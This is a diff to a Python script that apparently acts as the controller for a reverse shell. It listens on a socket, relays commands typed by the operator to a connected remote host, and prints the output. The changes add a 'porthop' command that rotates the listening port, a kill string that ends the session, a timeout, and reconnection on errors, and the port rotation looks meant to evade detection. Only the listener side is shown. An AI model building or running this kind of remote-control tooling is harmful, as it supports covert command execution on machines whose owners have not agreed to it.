@@ -7,6 +7,7 @@ PORT = ports[0]
 BUFFER = 1024
 
 KILLSTRING = "endme"
+HOP_STRING = "porthop"
 INFO_QUERY = "informationquery"
 
 PROMPT = "$ "
@@ -17,6 +18,7 @@ def nextPort(p):
 	if i == 5:
 		return ports[0]
 	return ports[i+1]
+	
 
 
 open_conn = False
@@ -24,8 +26,10 @@ while True:
 	try:
 		if not open_conn:
 			s = socket.socket()
+			s.settimeout(10)
 			s.bind((HOST, PORT))
 			print("Ready for connections on " + str(PORT))
+			PORT = nextPort(PORT)
 			s.listen(1)
 			conn, raddr = s.accept()
 			open_conn = True
@@ -33,18 +37,21 @@ while True:
 			time.sleep(1)
 			conn.send(INFO_QUERY.encode())
 			PROMPT = conn.recv(BUFFER).decode()
-			print("Prompt set: " + PROMPT)
 
 		cmd = input(PROMPT)
 		conn.send(cmd.encode())
 		
-		if cmd == KILLSTRING:
-			print("Ending")
+		if cmd == HOP_STRING:
+			print("Changing ports...")
 			conn.shutdown(1)
 			conn.close()
-			open_conn = False
 			s.close()
-			PORT = nextPort(PORT)
+			open_conn = False
+		elif cmd == KILLSTRING:
+			conn.shutdown(1)
+			conn.close()
+			s.close()
+			break
 		else:
 			rsp = conn.recv(BUFFER).decode()
 			if INFO_QUERY == rsp[0:len(INFO_QUERY)]:
@@ -52,5 +59,8 @@ while True:
 			else:
 				print(rsp)
 	except Exception as e:
-		print(e)
+		print(type(e))
+		open_conn = False
 		time.sleep(1)
+		
+print("Goodbye")
